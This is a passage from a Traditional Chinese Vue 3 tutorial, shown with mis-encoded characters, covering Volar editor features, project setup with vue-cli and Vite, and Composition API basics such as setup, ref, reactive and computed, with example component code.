style ä¸­å¯«å…¥ï¼š\nsample.vue 1 2 3 \u0026lt;style scoped\u0026gt; .foo {} \u0026lt;/style\u0026gt; é™¤äº† style ä¸­çš„ .foo ä¸Šé¢æœƒå‡ºç¾ 1 reference çš„å°åœ–æ¨™ä¹‹å¤–ï¼Œåœ¨ class=\u0026quot;foo\u0026quot; çš„ foo ä¸‹é¢ï¼Œæœƒå‡ºç¾ä¸€é“æ©«ç·šã€‚\nå°æ–¼ç¶“å¸¸ä½¿ç”¨ vscode çš„é–‹ç™¼äººå“¡ä¾†èªªï¼Œé€™ä»£è¡¨ä»€éº¼æ„ç¾©å°±ä¸å¿…å¤šèªªäº†ï¼Œæˆ‘å€‘æ ¹æ“šæç¤ºï¼ŒæŒ‰ä½ ctrl(command) ç„¶å¾Œé»æ“Šï¼Œæœƒç™¼ç¾å…‰æ¨™è‡ªå·±ç§»å‹•åˆ°äº† style ä¸­çš„ .foo ä¹‹å‰ï¼Œå“‡! awesome!\nåŠŸèƒ½å…­ï¼šcss module é¡å‹æç¤º css module ä¸€èˆ¬æ˜¯ react æŠ€è¡“æ£§ç”¨çš„æœƒæ¯”è¼ƒå¤šä¸€äº›ï¼Œå°±æˆ‘å€‹äººä¾†èªªï¼Œæ˜¯å¾æ²’åœ¨ vue è£¡é¢ä½¿ç”¨å®ƒçš„ï¼Œå› ç‚º vue æä¾›äº† scoped ä½œç”¨åŸŸï¼Œä¸ç”¨æ“”å¿ƒæ¨£å¼è¡çªï¼Œç›´æ¥ä½¿ç”¨é è™•ç†å™¨æœƒæ›´åŠ ç°¡å–®æ–¹ä¾¿ã€‚\næˆ‘å€‘å‰µå»ºå¦‚ä¸‹ä»£ç¢¼ï¼š\nsample.vue 1 2 3 4 5 6 7 \u0026lt;template\u0026gt; \u0026lt;div :class=\u0026#34;$style.foo\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;style module\u0026gt; .foo { } \u0026lt;/style\u0026gt; ç„¶å¾Œå°‡é¼ æ¨™ç§»å‹•åˆ° $style ä¸Š\næœ‰é»æ„æ€ï¼Œçœ‹ä¾† vscode æ˜¯è®“ Volar ç©æ˜ç™½äº†ã€‚\nåŠŸèƒ½ä¸ƒï¼šlang èªæ³•æç¤º vue å¯ä»¥ä½¿ç”¨ lang å±¬æ€§ä¾†é¸æ“‡ä½¿ç”¨çš„èªè¨€ï¼Œæ¯”å¦‚ template ä¸­çš„ html/pugã€script ä¸­çš„ tsã€style ä¸­çš„ scss ç­‰ã€‚\nä½†æ˜¯åœ¨ä»¥å‰ï¼Œæˆ‘å€‘éƒ½æ˜¯æ‰‹å‹•è¼¸å…¥çš„ï¼Œç·¨è¼¯å™¨ï¼Œæˆ–è€…èªª Vetur ä¸¦æ²’æœ‰çµ¦æˆ‘å€‘æä¾›ä»»ä½•æç¤ºï¼Œæœ‰å¯èƒ½ä½ æ‰¾äº†å¾ˆä¹…çš„è«åå…¶å¦™çš„å•é¡Œï¼Œå°±æ˜¯å› ç‚º lang å¯«éŒ¯äº†ã€‚\nä½†æ˜¯é€™ä¸€åˆ‡ï¼Œåœ¨æœ‰äº† Volar ä¹‹å¾Œï¼Œéƒ½ä¸åŒäº†ã€‚\nåŠŸèƒ½å…«ï¼štemplate èªæ³•è½‰æ› vue é»˜èªæä¾›äº†å…©ç¨®æ¨¡æ¿ä¾›æˆ‘å€‘ä½¿ç”¨ï¼Œä½†æ˜¯ä¸€èˆ¬éƒ½æœƒä½¿ç”¨ htmlï¼Œå¦å¤–ä¸€ç¨®å«åš pugã€‚\nç›¸å°æ–¼ htmlï¼Œpug æ›´åå‘æ–¼ yml é‚£ç¨®ï¼Œç°¡æ½”ç¨‹åº¦ç‰¹åˆ¥é«˜ã€‚\nåœ¨ Volar ä¸­ï¼Œç‚ºæˆ‘å€‘æä¾›äº† html å’Œ pug äº’ç›¸è½‰æ›çš„åŠŸèƒ½ã€‚\nsample.vue 1 2 3 4 5 6 7 8 9 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;li\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt; \u0026lt;img /\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; åœ¨æˆ‘å€‘æ›¸å¯« template ä¹‹å¾Œï¼Œtemplate é ‚éƒ¨æœƒå‡ºç¾ä¸€å€‹å°å°çš„ pug åœ–æ¨™ï¼Œæˆ‘å€‘å¯ä»¥çœ‹åˆ°æ­¤æ™‚å®ƒæ˜¯æ²’æœ‰è¢«é¸ä¸­çš„ã€‚\né€™å€‹æ™‚å€™æˆ‘å€‘é»æ“Šä¸€ä¸‹é€™å€‹åœ–æ¨™ï¼Œè®“å®ƒé¸ä¸­ï¼Œç¥å¥‡çš„äº‹æƒ…ç™¼ç”Ÿäº†ã€‚\næˆ‘å€‘å¯«å¥½çš„ html æ¨¡æ¿ï¼Œè¢«è‡ªå‹•è½‰åŒ–æˆäº† pugï¼Œå†é»æ“Šä¸€ä¸‹ï¼Œåˆå›åˆ°äº†æˆ‘å€‘ç†Ÿæ‚‰çš„ htmlã€‚\nå¾åŠŸèƒ½ä¸‰é–‹å§‹ï¼ŒåŸºæœ¬éƒ½æ˜¯ç®—å…§æ¸¬çš„æ–°åŠŸèƒ½ï¼Œæˆ‘æ˜¯æ©Ÿç·£å·§åˆä¹‹ä¸‹ï¼Œå°‡ Volar ä¸‹åˆ°æœ¬åœ°é€²è¡ŒæŸ¥çœ‹çš„æ™‚å€™ç™¼ç¾çš„é€™äº›ã€‚æƒ³åšé®®çš„å¯ä»¥è‡ªå·±ä¸‹è¼‰æºç¢¼ï¼Œç„¶å¾Œåœ¨packages/vscode-vue-languageservice/testCasesç›®éŒ„ä¸‹é«”é©—ï¼Œå¸Œæœ›é€™äº›åŠŸèƒ½å¯ä»¥ç›¡å¿«ç™¼å¸ƒï¼\nVue 3 Snippets æ¨è–¦çš„ç¬¬äºŒå€‹å¤–æ›å«åš Vue 3 Snippets ï¼ŒåŒæ¨£çš„ï¼Œä»–ä¹Ÿæœ‰è‡ªå·±çš„ Vue2 ç‰ˆæœ¬ã€‚å®ƒæ˜¯å¹¹ä»€éº¼çš„å‘¢ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹ä¸‹é¢é€™å¼µåœ–ï¼Œæˆ‘åªè¼¸å…¥äº† \u0026quot;v3\u0026quot; ï¼Œå®ƒæœ‰å¾ˆå¤šæç¤ºï¼Œæˆ‘å€‘å°±å…ˆé¸æ“‡ v3computed ï¼Œé¸ä¸­ Enter å³å¯ã€‚\nç„¶å¾Œå®ƒå°±çµ¦æˆ‘å€‘è‡ªå‹•å¯«äº†å¦‚ä¸‹ç¨‹å¼ç¢¼ï¼š\næ˜¯ä¸æ˜¯è¶…ç´šçœäº‹ï¼Œæ‘¸é­šçš„æ™‚é–“åˆå¢åŠ äº†ï¼é‚„æœ‰æ›´å¤šæœ‰è¶£çš„ä½¿ç”¨æ–¹å¼ï¼Œå°å¤¥ä¼´å€‘è‡ªè¡Œæ¢ç´¢å§ã€‚\nå»ºç«‹ Vue3 å°ˆæ¡ˆ é‚£éº¼æ­£å¼é–‹å§‹å­¸ç¿’æˆ‘å€‘çš„ Vue3 ï¼Œå…ˆå¾å»ºç«‹å°ˆæ¡ˆé–‹å§‹ã€‚\nä½¿ç”¨ vue-cli å»ºç«‹ è¼¸å…¥ä¸‹é¢çš„å‘½ä»¤ç„¶å¾Œé¸æ“‡é…ç½®é …é€²è¡Œå®‰è£å³å¯ï¼Œé€™è£¡æ³¨æ„ vue-cli çš„ç‰ˆæœ¬ä¸€å®šè¦åœ¨ ==4.5.0== ä»¥ä¸Šã€‚\n1 2 3 4 5 6 7 8 ### å®‰è£æˆ–è€…å‡ç´š npm install -g @vue/cli ### æª¢è¦–ç‰ˆæœ¬ ä¿è­‰ vue cli ç‰ˆæœ¬åœ¨ 4.5.0 ä»¥ä¸Š vue --version ### å»ºç«‹å°ˆæ¡ˆ vue create my-project ### ç„¶å¾Œæ ¹æ“šæç¤ºä¸€æ­¥ä¸€æ­¥å‚»ç“œå¼æ“ä½œå°±è¡Œäº† ### ... ä½¿ç”¨ Vite å»ºç«‹ éƒ½èªª Vue3.0 å’Œ Vite2 æ›´é…ï¼Œå„ç¨®å„ªåŒ–å„ç¨®å¿«ï¼Œä½†éƒ½ä¸å±¬æ–¼æœ¬æ–‡çš„å…§å®¹ï¼Œæœ¬æ–‡çš„ç›®çš„æˆ‘å€‘åªéœ€è¦çŸ¥é“å®ƒç‰¹åˆ¥å¥½ç”¨ã€æ€éº¼ç”¨å°±è¡Œäº†ã€‚æˆ‘é€™è£¡æ˜¯å¤šé¸æ“‡äº† TSï¼Œæ¯è¡Œéƒ½æœ‰è¨»é‡‹ï¼Œä¸€ç›®ç­ç„¶ã€‚\n1 2 3 4 5 6 7 8 ### åˆå§‹åŒ– viete å°ˆæ¡ˆ npm init vite-app \u0026lt;project-name\u0026gt; ### é€²å…¥å°ˆæ¡ˆè³‡æ–™å¤¾ cd \u0026lt;project-name\u0026gt; ### å®‰è£ä¾è³´ npm install ### å•Ÿå‹•å°ˆæ¡ˆ npm run dev å»ºç«‹å®Œä»¥å¾Œæˆ‘å€‘å…ˆä¾†çœ‹çœ‹å…¥å£æª”æ¡ˆ main.ts\nmain.ts 1 2 3 4 5 6 // å¼•å…¥ createApp å‡½å¼ï¼Œå»ºç«‹å°æ‡‰çš„æ‡‰ç”¨ï¼Œç”¢ç”Ÿæ‡‰ç”¨çš„ä¾‹é …ç‰©ä»¶ import { createApp } from \u0026#39;vue\u0026#39;; // å¼•å…¥ app å…ƒä»¶ (æ‰€æœ‰å…ƒä»¶çš„çˆ¶ç´šå…ƒä»¶) import App from \u0026#39;./App.vue\u0026#39;; // å»ºç«‹ app æ‡‰ç”¨è¿”å›å°æ‡‰çš„ä¾‹é …ç‰©ä»¶ï¼Œå‘¼å« mount æ–¹æ³•é€²è¡Œæ›è¼‰ï¼Œæ›è¼‰åˆ° #app ç¯€é»ä¸Šå» createApp(App).mount(\u0026#39;#app\u0026#39;); ç„¶å¾Œçœ‹çœ‹æ ¹å…ƒä»¶ app.vue\napp.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;!-- Vue2 å…ƒä»¶ä¸­çš„ html æ¨¡æ¿ä¸­å¿…é ˆè¦æœ‰ä¸€å°æ ¹æ¨™ç±¤ï¼ŒVue3 å…ƒä»¶çš„ html æ¨¡æ¿ä¸­å¯ä»¥æ²’æœ‰æ ¹æ¨™ç±¤ --\u0026gt; \u0026lt;template\u0026gt; \u0026lt;img alt=\u0026#34;Vue logo\u0026#34; src=\u0026#34;./assets/logo.png\u0026#34;\u0026gt; \u0026lt;!-- ä½¿ç”¨å­ç´šå…ƒä»¶ --\u0026gt; \u0026lt;HelloWorld msg=\u0026#34;Welcome to Your Vue.js + TypeScript App\u0026#34; /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; // é€™è£¡å¯ä»¥æ›¸å¯« TS ç¨‹å¼ç¢¼ // defineComponent å‡½å¼ï¼Œç›®çš„æ˜¯å®šç¾©ä¸€å€‹å…ƒä»¶ï¼Œå…§éƒ¨å¯ä»¥å‚³å…¥ä¸€å€‹é…ç½®ç‰©ä»¶ import { defineComponent } from \u0026#39;vue\u0026#39;; // å¼•å…¥å­ç´šå…ƒä»¶ import HelloWorld from \u0026#39;./components/HelloWorld.vue\u0026#39;; // æš´éœ²å‡ºå»ä¸€å€‹å®šç¾©å¥½çš„å…ƒä»¶ export default defineComponent({ // ç•¶å‰å…ƒä»¶çš„åå­— name: \u0026#39;App\u0026#39;, // è¨»å†Šå…ƒä»¶ components: { // è¨»å†Šä¸€å€‹å­ç´šå…ƒä»¶ HelloWorld, }, }); \u0026lt;/script\u0026gt; Composition API æ¥ä¸‹ä¾†åˆ°äº†é‡é ­æˆ²ï¼ŒVue3 çš„æ‹›ç‰Œç‰¹æ€§ï¼ŒComposition APIã€‚\né—œæ–¼ Composition API é€™è£¡æœ‰åœ–è§£æ¼”ç¤ºï¼Œæ¥µåŠ›æ¨è–¦ã€‚\nåœ–è§£ Option API vs Composition API\nComposition API å¯ä»¥æ›´æ–¹ä¾¿çš„æŠ½å–å…±é€šé‚è¼¯ï¼Œä½†æ˜¯ä¸è¦éæ–¼åœ¨æ„é‚è¼¯ç¨‹å¼ç¢¼è¤‡ç”¨ï¼Œä»¥åŠŸèƒ½æå–ç¨‹å¼ç¢¼ä¹Ÿæ˜¯ä¸€ç¨®æ€è·¯ã€‚ é †ä¾¿æä¸€å¥ï¼ŒVue3 ç›¸å®¹å¤§éƒ¨åˆ† Vue2 èªæ³•ï¼Œæ‰€ä»¥åœ¨ Vue3 ä¸­æ›¸å¯« Vue2 èªæ³•æ˜¯æ²’æœ‰å•é¡Œçš„ï¼ˆå»¢é™¤çš„é™¤å¤–ï¼‰ï¼Œä½†æ˜¯æ—¢ç„¶æˆ‘å€‘å·²ç¶“å‡ç´š Vue3 äº†ï¼Œä¸å»ºè­°æ··åˆä½¿ç”¨ï¼Œé™¤éä¸€äº›å¤§å‹ç‰¹æ®Šå°ˆæ¡ˆéœ€è¦ç›¸å®¹å…©å€‹ç‰ˆæœ¬ã€‚\nç”Ÿå‘½é€±æœŸé‰¤å­ setup setup æ˜¯çµ„åˆ Composition API ä¸­çš„å…¥å£å‡½å¼ï¼Œä¹Ÿæ˜¯ç¬¬ä¸€å€‹è¦ä½¿ç”¨çš„å‡½å¼ã€‚ setup åªåœ¨åˆå§‹åŒ–æ™‚åŸ·è¡Œä¸€æ¬¡ï¼Œæ‰€æœ‰çš„ Composition API å‡½å¼éƒ½åœ¨æ­¤ä½¿ç”¨ã€‚ 1 2 3 setup() { console.log(\u0026#39;æˆ‘åŸ·è¡Œäº†\u0026#39;) // æˆ‘åŸ·è¡Œäº† }, å¯ä»¥é€šé console.log çœ‹åˆ° setup æ˜¯åœ¨ beforeCreate ç”Ÿå‘½é€±æœŸä¹‹å‰åŸ·è¡Œçš„(åªåŸ·è¡Œä¸€æ¬¡)ï¼š\n1 2 3 4 5 6 7 8 9 beforeCreate() { console.log(\u0026#39;beforeCreateåŸ·è¡Œäº†\u0026#39;); }, setup() { console.log(\u0026#39;setupåŸ·è¡Œäº†\u0026#39;); return {}; }, // setupåŸ·è¡Œäº† // beforeCreateåŸ·è¡Œäº† ç”±æ­¤å¯ä»¥æ¨æ–·å‡º setup åŸ·è¡Œçš„æ™‚å€™ï¼Œå…ƒä»¶ç‰©ä»¶é‚„æ²’æœ‰å»ºç«‹ï¼Œå…ƒä»¶å¯¦ä¾‹ç‰©ä»¶ this é‚„ä¸å¯ç”¨ï¼Œæ­¤æ™‚ this æ˜¯ undefinedï¼Œä¸èƒ½é€šé this ä¾†è¨ªå• dataã€computedã€methodsã€propsã€‚ è¿”å›ç‰©ä»¶ä¸­çš„^1.^å±¬æ€§æœƒèˆ‡ data å‡½å¼è¿”å›ç‰©ä»¶çš„å±¬æ€§åˆä½µæˆç‚ºå…ƒä»¶ç‰©ä»¶çš„å±¬æ€§ï¼›^2.^è¿”å›ç‰©ä»¶ä¸­çš„æ–¹æ³•æœƒèˆ‡ methods ä¸­çš„æ–¹æ³•åˆä½µæˆåŠŸå…ƒä»¶ç‰©ä»¶çš„æ–¹æ³•ã€‚ å¦‚æœæœ‰é‡åï¼Œsetup å„ªå…ˆã€‚å› ç‚ºåœ¨ setup ä¸­ this ä¸å¯ç”¨ï¼Œmethods ä¸­å¯ä»¥è¨ªå• setup æä¾›çš„å±¬æ€§å’Œæ–¹æ³•ï¼Œä½†åœ¨ setup æ–¹æ³•ä¸­ä¸èƒ½è¨ªå• data å’Œ methods è£¡çš„å…§å®¹ï¼Œæ‰€ä»¥é‚„æ˜¯ä¸å»ºè­°æ··åˆä½¿ç”¨ã€‚ setup å‡½å¼å¦‚æœè¿”å›ç‰©ä»¶ï¼Œç‰©ä»¶ä¸­çš„å±¬æ€§æˆ–æ–¹æ³•ï¼Œtemplate ä¸­å¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚ sample.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt;{{number}}\u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; // ... setup() { const number = 18; return { number, }; }, // ... \u0026lt;/script\u0026gt; æ³¨æ„ï¼šsetup ä¸èƒ½æ˜¯ä¸€å€‹ async å‡½å¼ï¼Œå› ç‚ºè¿”å›å€¼ä¸å†æ˜¯ return çš„ç‰©ä»¶ï¼Œè€Œæ˜¯ promiseï¼Œtemplate ä¸­å°±ä¸å¯ä»¥ä½¿ç”¨ return ä¸­è¿”å›ç‰©ä»¶çš„è³‡æ–™äº†ã€‚\nsetup çš„åƒæ•¸(^1.^props, ^2.^context)ï¼š\npropsï¼šæ˜¯ä¸€å€‹ç‰©ä»¶ï¼Œè£¡é¢æœ‰çˆ¶ç´šå…ƒä»¶å‘å­ç´šå…ƒä»¶å‚³éçš„è³‡æ–™ï¼Œä¸¦ä¸”æ˜¯åœ¨å­ç´šå…ƒä»¶ä¸­ä½¿ç”¨ props æ¥æ”¶åˆ°çš„æ‰€æœ‰çš„å±¬æ€§ã€‚ contextï¼šä¸Šä¸‹æ–‡ç‰©ä»¶ï¼Œå¯ä»¥é€šé es6 èªæ³•è§£æ§‹ setup(props, {^(a).^attrs, ^(b).^slots, ^(c).^emit})\n\u0026gt; a). attrsï¼šç²å–ç•¶å‰å…ƒä»¶æ¨™ç±¤ä¸Šæ‰€æœ‰æ²’æœ‰é€šé props æ¥æ”¶çš„å±¬æ€§çš„ç‰©ä»¶ï¼Œç›¸ç•¶æ–¼ this.$attrsã€‚\n\u0026gt; b). slotsï¼šåŒ…å«æ‰€æœ‰å‚³å…¥çš„æ’æ§½å…§å®¹çš„ç‰©ä»¶ï¼Œç›¸ç•¶æ–¼ this.$slotsã€‚\n\u0026gt; c). emitï¼šç”¨ä¾†åˆ†ç™¼è‡ªå®šç¾©äº‹ä»¶çš„å‡½å¼ï¼Œç›¸ç•¶æ–¼ this.$emitã€‚ æ¼”ç¤º attrs å’Œ propsï¼š parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;template\u0026gt; \u0026lt;child :msg=\u0026#34;msg\u0026#34; msg2=\u0026#39;å“ˆå“ˆå“ˆ\u0026#39; /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#39;ts\u0026#39;\u0026gt; import { defineComponent, ref } from \u0026#39;vue\u0026#39;; // å¼•å…¥å­å…ƒä»¶ import Child from \u0026#39;./components/Child.vue\u0026#39;; export default defineComponent({ name: \u0026#39;App\u0026#39;, components: { Child, }, setup() { const msg = ref(\u0026#39;hello,vue3\u0026#39;); return { msg, }; }, }); \u0026lt;/script\u0026gt; children.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;template\u0026gt; \u0026lt;h2\u0026gt;å­å…ƒä»¶\u0026lt;/h2\u0026gt; \u0026lt;h3\u0026gt;msg:{{ msg }}\u0026lt;/h3\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#39;ts\u0026#39;\u0026gt; import { defineComponent } from \u0026#39;vue\u0026#39;; export default defineComponent({ name: \u0026#39;Child\u0026#39;, props: [\u0026#39;msg\u0026#39;], setup(props, {attrs, slots, emit}) { console.log(\u0026#39;props:\u0026#39;, props); // msg: \u0026#34;hello,vue3\u0026#34; console.log(\u0026#39;attrs:\u0026#39;, attrs); // msg2: \u0026#34;å“ˆå“ˆå“ˆ\u0026#34; return {}; }, }); \u0026lt;/script\u0026gt; æ¼”ç¤º emitï¼š parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;template\u0026gt; \u0026lt;child @click=\u0026#34;show\u0026#34; /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#39;ts\u0026#39;\u0026gt; setup() { const show = () =\u0026gt; { console.log(\u0026#39;name:\u0026#39;, \u0026#39;hzw\u0026#39;); }; return { show, }; }, \u0026lt;/script\u0026gt; children.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;template\u0026gt; \u0026lt;button\u0026gt;äº‹ä»¶åˆ†ç™¼\u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#39;ts\u0026#39;\u0026gt; import { defineComponent } from \u0026#39;vue\u0026#39;; export default defineComponent({ name: \u0026#39;Child\u0026#39;, setup(props, { emit }) { const emitFn = () =\u0026gt; { emit(\u0026#39;show\u0026#39;); }; return { emitFn, }; }, }); \u0026lt;/script\u0026gt; ref ä½œç”¨ï¼šå®šç¾©ä¸€å€‹éŸ¿æ‡‰å¼çš„è³‡æ–™(ä¸€èˆ¬ç”¨ä¾†å®šç¾©ä¸€å€‹åŸºæœ¬å‹åˆ¥çš„éŸ¿æ‡‰å¼è³‡æ–™ Undefinedã€Nullã€Booleanã€Numberã€String) èªæ³•ï¼š 1 const xxx = ref(initValue); æ³¨æ„ï¼šscript ä¸­æ“ä½œè³‡æ–™éœ€è¦ä½¿ç”¨ xxx.value çš„å½¢å¼ï¼Œè€Œ template ä¸­ä¸éœ€è¦æ–°å¢ .value ç”¨ä¸€å€‹ä¾‹å­ä¾†æ¼”ç¤ºï¼Œå¯¦ç¾ä¸€å€‹æŒ‰éˆ•ï¼Œé»é¸å¯ä»¥å¢åŠ æ•¸å­—ï¼š\naddNum.vue 1 2 3 4 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt;{{count}}\u0026lt;/div\u0026gt; \u0026lt;button @click=\u0026#39;updateCount\u0026#39;\u0026gt;å¢åŠ \u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; åœ¨ Vue2 ä¸­ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;script\u0026gt; // ... data() { return { conunt: 0, }; }, methods: { updateCount() { this.conunt++; }, }, // ... \u0026lt;/script\u0026gt; åœ¨ Vue3 ä¸­ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;script\u0026gt; // ... setup() { // ref ç”¨æ–¼å®šç¾©ä¸€å€‹éŸ¿æ‡‰å¼çš„è³‡æ–™ï¼Œè¿”å›çš„æ˜¯ä¸€å€‹ Ref ç‰©ä»¶ï¼Œç‰©ä»¶ä¸­æœ‰ä¸€å€‹ value å±¬æ€§ // å¦‚æœéœ€è¦å°è³‡æ–™é€²è¡Œæ“ä½œï¼Œéœ€è¦ä½¿ç”¨è©² Ref ç‰©ä»¶çš„ value å±¬æ€§ const count = ref(0); function updateCount() { count.value++; } return { count, updateCount }; }, // ... \u0026lt;/script\u0026gt; åœ¨ Vue2 ä¸­æˆ‘å€‘é€šé this.$refs ä¾†ç²å– dom ç¯€é»ï¼ŒVue3 ä¸­æˆ‘å€‘é€šé ref ä¾†ç²å–ç¯€é»ã€‚\né¦–å…ˆéœ€è¦åœ¨æ¨™ç±¤ä¸Šæ–°å¢ ref='xxx'ï¼Œç„¶å¾Œå† setup ä¸­å®šç¾©ä¸€å€‹åˆå§‹å€¼ç‚º null çš„ ref å‹åˆ¥ï¼Œåå­—è¦å’Œæ¨™ç±¤çš„ ref å±¬æ€§ä¸€è‡´ã€‚\n1 const xxx = ref(null) æ³¨æ„ ï¼šä¸€å®šè¦åœ¨ setup çš„ return ä¸­è¿”å›ï¼Œä¸ç„¶æœƒå ±éŒ¯ã€‚\nç”¨ä¸€å€‹ä¾‹å­ä¾†æ¼”ç¤ºï¼Œè®“è¼¸å…¥æ¡†è‡ªå‹•ç²å–ç„¦é»ï¼š\nautoFocus.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;template\u0026gt; \u0026lt;h2\u0026gt;App\u0026lt;/h2\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34;\u0026gt;--- \u0026lt;input type=\u0026#34;text\u0026#34; ref=\u0026#34;inputRef\u0026#34;\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import { onMounted, ref } from \u0026#39;vue\u0026#39; /* refç²å–å…ƒç´ : åˆ©ç”¨ ref å‡½å¼ç²å–å…ƒä»¶ä¸­çš„æ¨™ç±¤å…ƒç´  åŠŸèƒ½éœ€æ±‚: è®“è¼¸å…¥æ¡†è‡ªå‹•ç²å–ç„¦é» */ export default { setup() { const inputRef = ref\u0026lt;HTMLElement|null\u0026gt;(null) onMounted(() =\u0026gt; { inputRef.value \u0026amp;\u0026amp; inputRef.value.focus() }) return { inputRef } }, } \u0026lt;/script\u0026gt; reactive ä½œç”¨ï¼šå®šç¾©å¤šå€‹æ•¸æ“šçš„éŸ¿æ‡‰å¼ï¼Œæ¥æ”¶ä¸€å€‹æ™®é€šç‰©ä»¶ç„¶å¾Œè¿”å›è©²æ™®é€šç‰©ä»¶çš„éŸ¿æ‡‰å¼ä»£ç†å™¨ç‰©ä»¶(Proxy)ï¼ŒéŸ¿æ‡‰å¼è½‰æ›æ˜¯\u0026quot;æ·±å±¤çš„\u0026quot;ï¼šæœƒå½±éŸ¿ç‰©ä»¶å…§éƒ¨æ‰€æœ‰å·¢ç‹€çš„å±¬æ€§ï¼Œæ‰€æœ‰çš„è³‡æ–™éƒ½æ˜¯éŸ¿æ‡‰å¼çš„ã€‚ èªæ³•ï¼š 1 const proxy = reactive(obj) ç¨‹å¼ç¢¼æ¼”ç¤ºï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 \u0026lt;template\u0026gt; \u0026lt;h3\u0026gt;å§“å:{{user.name}}\u0026lt;/h3\u0026gt; \u0026lt;h3\u0026gt;å¹´é½¡:{{user.age}}\u0026lt;/h3\u0026gt; \u0026lt;h3\u0026gt;wife:{{user.wife}}\u0026lt;/h3\u0026gt; \u0026lt;button @click=\u0026#34;updateUser\u0026#34;\u0026gt;æ›´æ–°\u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; // ... setup() { const user = reactive({ name: \u0026#39;hzw\u0026#39;, age: 18, wife: { name: \u0026#39;xioaohong\u0026#39;, age: 18, books: [\u0026#39;ç´…å¯¶æ›¸\u0026#39;, \u0026#39;è¨­è¨ˆæ¨¡å¼\u0026#39;, \u0026#39;æ¼”ç®—æ³•èˆ‡è³‡æ–™çµæ§‹\u0026#39;], }, }); const updateUser = () =\u0026gt; { user.name = \u0026#39;å°ç´…\u0026#39;; user.age += 2; user.wife.books[0] = \u0026#39;é‡‘ç“¶æ¢…\u0026#39;; }; return { user, updateUser, }; }, // ... \u0026lt;/script\u0026gt; computed èˆ‡ Vue2 ä¸­çš„ computed é…ç½®åŠŸèƒ½ä¸€è‡´ï¼Œè¿”å›çš„æ˜¯ä¸€å€‹ ref å‹åˆ¥çš„ç‰©ä»¶ã€‚ computed çš„å‡½å¼ä¸­å¦‚æœåªå‚³å…¥ä¸€å€‹ç®­é ­å‡½å¼ è¡¨ç¤ºçš„æ˜¯ get æ“ä½œï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 import { computed } from \u0026#39;vue\u0026#39;; const user = reactive({ firstName: \u0026#39;éŸ“\u0026#39;, lastName: \u0026#39;å¿—å‰\u0026#39;, }); const fullName1 = computed(() =\u0026gt; { return user.firstName + user.lastName; }); return { user, fullName1, }; computed çš„å‡½å¼ä¸­å¯ä»¥å‚³å…¥ä¸€å€‹ç‰©ä»¶ï¼Œå¯ä»¥åŒ…å« set å’Œ get å‡½å¼ï¼Œé€²è¡Œè®€å–å’Œä¿®æ”¹çš„æ“ä½œï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import { computed } from \u0026#39;vue\u0026#39;; const user = reactive({ firstName: \u0026#39;éŸ“\u0026#39;, lastName: \u0026#39;å¿—å‰\u0026#39;, }); const fullName2 = computed({ get() { return user.firstName + \u0026#39;_\u0026#39; + user.lastName; }, set(val: string) { const names = val.split(\u0026#39;_\u0026#39;); user.firstName = names[0]; user.lastName = names[1]; }, }); return { user, fullName2, }; watch èˆ‡ Vue2 ä¸­çš„ watch é…ç½®åŠŸèƒ½ä¸€è‡´ã€‚ ä½œç”¨ï¼šç›£è¦–æŒ‡å®šçš„ä¸€å€‹æˆ–å¤šå€‹éŸ¿æ‡‰å¼è³‡æ–™ï¼Œä¸€æ—¦è³‡æ–™è®ŠåŒ–ï¼Œå°±è‡ªå‹•åŸ·è¡Œç›£è¦–å›æ’¥ã€‚ èªæ³•ï¼šwatch(è¦ç›£è½çš„è³‡æ–™, å›èª¿å‡½å¼, é…ç½®) é è¨­åˆå§‹æ™‚ä¸åŸ·è¡Œå›èª¿ï¼Œä½†å¯ä»¥é€šéé…ç½®çš„ immediate ç‚º trueï¼Œä¾†æŒ‡å®šåˆå§‹æ™‚ç«‹å³åŸ·è¡Œç¬¬ä¸€æ¬¡ã€‚ é€šéé…ç½®çš„ deep ç‚º trueï¼Œä¾†æŒ‡å®šæ·±åº¦ç›£è¦–ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import { watch, ref } from \u0026#39;vue\u0026#39;; const user = reactive({ firstName: \u0026#39;éŸ“\u0026#39;, lastName: \u0026#39;å¿—å‰\u0026#39;, }); const 